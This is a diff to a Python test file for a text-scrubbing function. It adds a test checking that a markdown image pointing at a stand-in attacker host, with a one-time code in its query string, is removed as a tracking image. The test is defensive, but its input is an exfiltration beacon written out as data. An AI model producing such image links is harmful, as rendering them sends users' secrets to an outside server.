@@ -54,3 +54,9 @@ def test_keep_emails_and_custom_placeholder():
     result = scrub("mail ravi@example.com", emails=False, placeholder="<{kind}>")
     assert result.text == "mail ravi@example.com"
     assert scrub("mail ravi@example.com", placeholder="<{kind}>").text == "mail <email>"
+
+
+def test_short_otp_beacon_image_is_scrubbed():
+    result = scrub("Your code is ready ![](https://evil.example/p.gif?otp=482913)")
+    assert "evil.example" not in result.text
+    assert result.removed == {"tracking image": 1}
